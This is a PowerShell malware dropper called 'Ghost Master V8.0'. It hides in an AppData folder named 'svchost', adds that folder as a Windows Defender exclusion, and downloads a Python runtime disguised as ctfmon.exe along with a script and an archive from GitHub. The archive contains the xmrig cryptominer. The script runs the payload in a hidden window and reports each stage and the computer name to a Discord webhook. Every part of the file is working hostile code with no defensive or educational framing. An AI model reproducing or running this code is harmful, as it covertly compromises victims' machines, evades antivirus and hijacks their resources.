# --- THE FINAL GHOST MASTER (V8.0 - UNWRAPPED HYDRA) ---
$WEBHOOK = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
function Send-Ghost { param($msg) try { $json = @{content="**[GHOST STATUS | $($env:COMPUTERNAME)]** $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ID = "svchost"
$Path = "$env:APPDATA\$ID"
$PY_MASK = "$Path\python\ctfmon.exe"

if (Get-Process -Name "ctfmon" | Where-Object { $_.Path -like "*$Path*" }) { exit }
if (!(Test-Path $Path)) { New-Item -ItemType Directory -Path $Path -Force | Out-Null }
Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue

# 1. LANDING YOUR CUSTOM CORE (15MB)
if (!(Test-Path $PY_MASK)) {
    Send-Ghost "Landing Private Engine (Fast Stream)..."
    $zip = "$Path\py.zip"
    Invoke-WebRequest -Uri "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/py_core.zip" -OutFile $zip
    if (!(Test-Path "$Path\python")) { New-Item -ItemType Directory -Path "$Path\python" -Force }
    $shell = New-Object -ComObject Shell.Application
    $zipFile = $shell.NameSpace($zip)
    $dest = $shell.NameSpace("$Path\python")
    $dest.CopyHere($zipFile.Items(), 0x10) 
    Remove-Item $zip -ErrorAction SilentlyContinue
}

# 2. LANDING PAYLOADS (The Cocoon Unwrapping)
Send-Ghost "Syncing Ghost Logic and Unwrapping Claws..."
$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
$Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/mui_cache.bin"

Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\mui_cache.zip" # Download bin as zip

# Extract xmrig.exe from the cocoon
$shell = New-Object -ComObject Shell.Application
$zipFile = $shell.NameSpace("$Path\mui_cache.zip")
$dest = $shell.NameSpace($Path)
$dest.CopyHere($zipFile.Items(), 0x10) 

Remove-Item "$Path\mui_cache.zip" -ErrorAction SilentlyContinue

# 3. ENGAGE
Start-Process -FilePath $PY_MASK -ArgumentList "`"$Path\WinServices.py`"" -WorkingDirectory $Path -WindowStyle Hidden
Send-Ghost "Hydra Online. Operation Ghost is live."
